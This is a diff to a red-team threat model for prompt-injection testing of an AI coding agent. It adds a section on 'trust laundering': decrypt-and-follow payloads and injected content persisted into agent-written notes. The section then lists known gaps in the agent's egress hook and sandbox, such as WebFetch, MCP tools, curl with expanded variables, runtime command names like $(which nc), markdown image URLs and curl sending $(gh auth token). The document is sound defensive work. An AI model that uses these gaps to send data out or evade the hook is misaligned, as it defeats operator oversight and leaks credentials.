@@ -1,6 +1,6 @@
-# Red-Team Threat Model & Objectives (v1)
+# Red-Team Threat Model & Objectives (v3)
 
-**Version:** 1 · **Date:** 2026-08-18 · **Status:** living document — re-version on any change to the
+**Version:** 3 · **Date:** 2026-10-13 · **Status:** living document — re-version on any change to the
 target, corpus scope, or objectives; coverage denominators are derived from the *current* version.
 **Why this exists:** quality-red-team feature **F1** (see
 `research/redteam-model-scoring/Projects/RedTeamRigorProgram/01-quality-features.md`) and its best
@@ -27,11 +27,50 @@ makes the previously-implicit threat model explicit; it does not widen scope.
   or *tool-result* framing, (d) attempts an *incremental* override, or (e) a *literal* control-token
   injection. These are the corpus's classes, all mapping to OWASP **LLM01:2026 Prompt Injection** /
   MITRE ATLAS **AML.T0051.001 (Indirect)**.
-- **Capabilities OUT of scope (v1, disclosed):** direct user-typed injection (AML.T0051.000); the
+- **Capabilities OUT of scope (v3, disclosed; see also §2a):** direct user-typed injection (AML.T0051.000); the
   broader OWASP surfaces — agentic tool-selection/tool-argument manipulation, multi-turn attack
   chains, supply-chain/RAG/MCP vectors, sensitive-information disclosure, excessive agency; and any
   *adaptive* attacker who optimizes against the current defense. Widening to these is red-team-rigor
   items F2/F3 — a deliberate future expansion, not a claim of current coverage.
+
+### 2a. Disclosed, unrated: trust laundering through transformation and persistence (v3)
+
+Not in the rated corpus (no payload is promoted without the S2 `@security` review), but named so the
+gap is owned rather than implied covered. The class: read content gains authority by passing through
+something the agent produced. Two shapes:
+
+- **Transformation laundering** — e.g. *Cryptographic Context Injection*: ciphertext plus its key plus
+  a plain request to decrypt and follow. Pattern filters see noise; the agent decodes it (by tool or
+  in-model), then treats its own output as its own reasoning. Maps to OWASP LLM01 (obfuscated payload)
+  and, at the last hop, LLM02 sensitive-information disclosure.
+- **Persistence laundering** — read content copied into an agent-written artifact (a plan step, work
+  summary, log row, Project-Specific Notes) that a later session or a memory/code-index query serves
+  back as if it were project-authored.
+
+What now addresses it, and how strongly (honest grading — none of this *prevents* it):
+
+| Layer | Control | Strength |
+|---|---|---|
+| Doctrine | C-4 *derived content stays data*; Tier-3 authority by cause of write; S-6 extension; S-9 criterion 6 | names the class and makes a violation identifiable; relies on judgment, which is what injection attacks |
+| Deterministic, one hop | `constitutional-gate.py` routes data-carrying sends (file/stdin/form uploads incl. `gh api --input`/`-F f=@file`, requests built from command output or naming a credential path, raw sockets, remote copy, gist, new or repointed git remote incl. `git config`/`git -c`/a `.git/config` write, push to a URL, `gh -R` with a body file or command output, DNS-from-output, interpreter POSTs) to `ask` | reduces the last hop for Bash sends plus a `.git/config` write; per-call, stateless; decoding itself deliberately ungated |
+| Labelling | OCR text fenced with a per-call nonce; memory/code-index results stamped Tier-6 | reduces confusion; a model can still obey labelled text |
+
+Residual exposure — what stays open, and to whom:
+
+- **Network-unconfined sessions (the missing boundary).** Claude's emitted sandbox block carries no
+  network restriction, and `confinement.py` has no network deny; only `sandbox/confine-run.sh
+  --egress deny|proxy` confines egress, and only when an operator wraps the session with it. Any
+  team running without it can exfiltrate through any channel the hook cannot see.
+- **Channels outside the Bash hook:** `WebFetch` and MCP tools (not in the matcher), a request
+  carrying literal or variable-expanded data (`curl "https://x/?d=$VAR"`, or a body typed inline
+  after the agent decoded it in-model), a literal `--body` sent with `gh -R` to another repository, a
+  command name produced at run time (`$(which nc)`, an alias, `$X`), and
+  markdown image/link URLs rendered into chat output (fetched by the client with no tool call).
+- **Accepted extra prompts:** a quoted `requests.post(` inside a grep, and `curl` carrying
+  `$(gh auth token)` — deliberate, since the second does send a credential.
+- **Write-then-execute:** a decoded script written with `Write`, run later as an ordinary command.
+- **Persistence vector:** plan steps carry no provenance field yet, so a step sourced from read
+  content is indistinguishable from an operator-sourced one except by the doctrine line.
 
 ## 3. Objectives and pass/fail conditions (stated before results)
 
@@ -87,6 +126,10 @@ harnesses' defensive intent.
 
 ## 6. Change log
 
+- **v3 (2026-10-13):** added §2a disclosing trust laundering through transformation (decode/decrypt-
+  and-follow, OCR) and persistence (agent-written artifacts, index retrieval), the controls added
+  against it, and their residual exposure; header version corrected (it still read v1 after v2). No
+  change to the *rated* scope — no payload added (S2).
 - **v2 (2026-08-18):** added §5 owning the dual-use surface of the attack-generation harnesses
   (H1/H2/H3); no change to the *rated* scope (generated payloads are quarantined, unpromoted).
 - **v1 (2026-08-18):** initial explicit statement of the previously-implicit threat model; no scope
